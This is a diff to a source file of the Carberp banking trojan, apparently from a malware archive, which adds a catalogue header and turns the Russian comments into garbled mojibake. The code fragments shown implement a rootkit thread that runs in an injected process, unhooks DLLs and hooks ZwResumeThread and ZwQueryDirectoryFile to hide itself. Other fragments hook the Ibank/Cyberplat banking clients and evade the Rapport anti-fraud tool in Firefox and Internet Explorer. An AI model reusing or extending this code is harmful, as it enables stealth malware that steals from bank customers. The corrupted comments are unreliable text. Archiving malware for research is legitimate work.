@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "GetApi.h"
@@ -27,7 +38,7 @@ namespace ROOTKITDEBUGSTRINGS
 	#include "DbgTemplates.h"
 }
 
-// Объявляем шаблон вывода отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #define RTKDBG ROOTKITDEBUGSTRINGS::DBGOutMessage<>
 
 
@@ -413,25 +424,25 @@ DWORD GetPidByThread(HANDLE hThread )
 
 DWORD WINAPI RootkitThread( LPVOID lpData )
 {
-    // Поток работает в заинжекченном процессе
+    // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	UnhookDlls();
 
 
 	HookZwResumeThread();	
 	HookZwQueryDirectoryFile();
 
-	// Подготавливаем данные для события
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	TEventData Data;
 	ClearStruct(Data);
 
-	// Определяем имя приложения
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR AppName = STR::Alloc(MAX_PATH);
 	if (AppName != NULL && pGetModuleFileNameA(NULL, AppName, MAX_PATH))
 		Data.Application = AppName;
 
 	
 
-	//  хук что ставиться при запуске Ibank Cyberplat как в ехе варианте так и веб
+	//  пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Ibank Cyberplat пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ
 	#ifdef RuBnkH //  
 		if (IbankHooksMain() )		return 0;		
 		//if (HookCyberplatPCMain())	return 0;
@@ -497,8 +508,8 @@ bool FindPid( DWORD dwPid )
 
 
 #ifdef _ANTIRAPPORT__INJECT__
-//для фф и ие при включенном антирапорте позволяет заюзать 4 инжект
-// (создает отдельный поток в процессе куда инжектимся)
+//пїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 4 пїЅпїЅпїЅпїЅпїЅпїЅ
+// (пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 
 
 NTSTATUS WINAPI ZwResumeThreadHook( HANDLE hThread, PULONG PreviousSuspendCount )
@@ -507,7 +518,7 @@ NTSTATUS WINAPI ZwResumeThreadHook( HANDLE hThread, PULONG PreviousSuspendCount 
 	NTSTATUS nt;
 	DWORD dwPid = GetPidByThread( hThread );
 	DWORD ProcessHash = GetProcessHashOfId(dwPid);
-	BOOL IsAntiRapport = IsRunAntiRapport() & ( (ProcessHash == 0x7712feae) | (ProcessHash == 0x250DFA8F) ); //  0x7712feae / 0x250DFA8F 	-	ХЕШ  фф / ИЕ
+	BOOL IsAntiRapport = IsRunAntiRapport() & ( (ProcessHash == 0x7712feae) | (ProcessHash == 0x250DFA8F) ); //  0x7712feae / 0x250DFA8F 	-	пїЅпїЅпїЅ  пїЅпїЅ / пїЅпїЅ
 
 	if (IsAntiRapport){
 		nt = ZwResumeThreadReal( hThread, PreviousSuspendCount );
